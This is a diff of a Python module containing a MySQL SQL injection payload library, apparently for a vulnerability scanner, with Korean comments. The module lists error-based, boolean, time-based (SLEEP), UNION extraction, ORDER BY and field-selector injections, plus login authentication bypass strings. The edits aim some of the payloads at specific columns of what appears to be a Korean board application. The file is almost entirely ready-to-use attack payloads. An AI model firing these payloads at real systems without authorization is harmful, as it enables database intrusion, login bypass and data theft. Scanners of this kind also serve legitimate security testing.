@@ -4,6 +4,7 @@ Payload = Dict[str, str]
 
 _SLEEP_SECS = 5
 
+# 공격 강도별 payload 개수 제한
 STRENGTH_LIMIT = {
     "LOW": 3,
     "MEDIUM": 6,
@@ -11,7 +12,7 @@ STRENGTH_LIMIT = {
     "INSANE": 100,
 }
 
-# MySQL error 시그니처
+# MySQL 오류 탐지 패턴
 ERROR_PATTERNS = [
     "you have an error in your sql syntax",
     "warning: mysql",
@@ -28,8 +29,7 @@ ERROR_PATTERNS = [
     "org.gjt.mm.mysql",
 ]
 
-
-# 문자열 컨텍스트에서 오류 기반 SQLi 페이로드
+# 문자열 컨텍스트용 Error-based SQLi
 ERROR_BASED: List[Payload] = [
     {"type": "SQLI_ERROR", "family": "extractvalue_database", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
     {"type": "SQLI_ERROR", "family": "extractvalue_version", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"},
@@ -39,8 +39,7 @@ ERROR_BASED: List[Payload] = [
     {"type": "SQLI_ERROR", "family": "floor_rand_group", "payload": "' AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- -"},
 ]
 
-
-# 문자열 컨텍스트에서 논리 기반 SQLi 페이로드
+# 문자열 컨텍스트용 Boolean SQLi
 BOOLEAN_BASED: List[Payload] = [
     {"type": "SQLI_BOOL", "family": "or_tautology", "payload": "' OR '1'='1"},
     {"type": "SQLI_BOOL", "family": "and_true", "payload": "' AND '1'='1'-- -"},
@@ -50,31 +49,25 @@ BOOLEAN_BASED: List[Payload] = [
     {"type": "SQLI_BOOL", "family": "length_check", "payload": "' AND LENGTH(database())>1-- -"},
 ]
 
-
-# 식별자  컨텍스트 (예: SELECT 절의 필드 선택기 또는 ORDER BY 절)에서 사용할 수 있는 페이로드
-FIELD_SELECTOR: List[Payload] = [
-    {"type": "SQLI_FIELD", "family": "field_if_sleep", "payload": f"IF(1=1,SLEEP({_SLEEP_SECS}),1)"},
-    {"type": "SQLI_FIELD", "family": "field_case_sleep", "payload": f"(CASE WHEN 1=1 THEN SLEEP({_SLEEP_SECS}) ELSE 1 END)"},
-    {"type": "SQLI_FIELD", "family": "field_extractvalue", "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
-    {"type": "SQLI_FIELD", "family": "field_updatexml", "payload": "UPDATEXML(1,CONCAT(0x7e,version()),1)"},
-    {"type": "SQLI_FIELD", "family": "field_bool_true", "payload": "IF(1=1,1,2)"},
-    {"type": "SQLI_FIELD", "family": "field_bool_false", "payload": "IF(1=2,1,2)"},
+# sfl 같은 필드 선택자 컨텍스트
+FIELD_SELECTOR = [
+    {"type": "SQLI_FIELD_BOOL", "family": "fs_true", "payload": "wr_subject AND 1=1-- -"},
+    {"type": "SQLI_FIELD_BOOL", "family": "fs_false", "payload": "wr_subject AND 1=2-- -"},
+    {"type": "SQLI_FIELD_TIME", "family": "fs_sleep", "payload": "wr_subject AND SLEEP(5)-- -"},
+    {"type": "SQLI_FIELD_ERROR", "family": "fs_extractvalue", "payload": "wr_subject AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
 ]
 
-# ORDER BY SQLi
-ORDERBY_INJECT: List[Payload] = [
-    {"type": "SQLI_TIME", "family": "ob_sleep_subquery", "payload": f"(SELECT SLEEP({_SLEEP_SECS}))"},
-    {"type": "SQLI_TIME", "family": "ob_if_sleep", "payload": f"IF(1=1,SLEEP({_SLEEP_SECS}),1)"},
-    {"type": "SQLI_TIME", "family": "ob_case_sleep", "payload": f"(CASE WHEN 1=1 THEN SLEEP({_SLEEP_SECS}) ELSE 1 END)"},
-    {"type": "SQLI_ERROR", "family": "ob_extractvalue", "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
-    {"type": "SQLI_ERROR", "family": "ob_updatexml", "payload": "UPDATEXML(1,CONCAT(0x7e,version()),1)"},
-    {"type": "SQLI_BOOL", "family": "ob_case_true", "payload": "(CASE WHEN 1=1 THEN 1 ELSE 2 END)"},
-    {"type": "SQLI_BOOL", "family": "ob_case_false", "payload": "(CASE WHEN 1=2 THEN 1 ELSE 2 END)"},
-    {"type": "SQLI_BOOL", "family": "ob_if_true", "payload": "IF(1=1,1,2)"},
-    {"type": "SQLI_BOOL", "family": "ob_if_false", "payload": "IF(1=2,1,2)"},
+# ORDER BY 정렬 차이 기반 SQLi
+ORDERBY_INJECT = [
+    {"type": "SQLI_ORDERBY_BASE", "family": "ob_base_datetime", "payload": "wr_datetime"},
+    {"type": "SQLI_ORDERBY_BASE", "family": "ob_base_hit", "payload": "wr_hit"},
+    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_case_true", "payload": "CASE WHEN 1=1 THEN wr_datetime ELSE wr_hit END"},
+    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_case_false", "payload": "CASE WHEN 1=2 THEN wr_datetime ELSE wr_hit END"},
+    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_if_true", "payload": "IF(1=1,wr_datetime,wr_hit)"},
+    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_if_false", "payload": "IF(1=2,wr_datetime,wr_hit)"},
 ]
 
-# 인증 우회
+# 로그인 인증 우회 SQLi
 AUTH_BYPASS: List[Payload] = [
     {"type": "SQLI_AUTH", "family": "auth_or_string_true", "payload": "' OR '1'='1'-- -"},
     {"type": "SQLI_AUTH", "family": "auth_or_numeric_true", "payload": "' OR 1=1-- -"},
@@ -84,7 +77,7 @@ AUTH_BYPASS: List[Payload] = [
     {"type": "SQLI_AUTH", "family": "auth_error_extract", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
 ]
 
-# 필터링이 적용된 문자열 컨텍스트에서 사용할 수 있는 페이로드
+# Time-based SQLi 템플릿
 _TIME_TEMPLATES = [
     ("time_string_and_sleep_sq", "{orig}' AND SLEEP({sleep})-- -"),
     ("time_string_and_sleep_dq", '{orig}" AND SLEEP({sleep})-- -'),
@@ -121,6 +114,7 @@ def _build_union_null_probes(max_cols: int = 6) -> List[Payload]:
     return probes
 
 
+# UNION 컬럼 수 탐지 및 정보 추출
 UNION_BASED: List[Payload] = _build_union_null_probes() + [
     {"type": "SQLI_UNION", "family": "version_extract", "payload": "' UNION SELECT version(),NULL,NULL-- -"},
     {"type": "SQLI_UNION", "family": "database_extract", "payload": "' UNION SELECT database(),NULL,NULL-- -"},
@@ -161,6 +155,7 @@ def build_time_based(orig: str = "1", sleep: int = _SLEEP_SECS) -> List[Payload]
     return results
 
 
+# SQL 컨텍스트별 payload 선택
 def get_by_sql_context(
     context: str,
     strength: str = "MEDIUM",
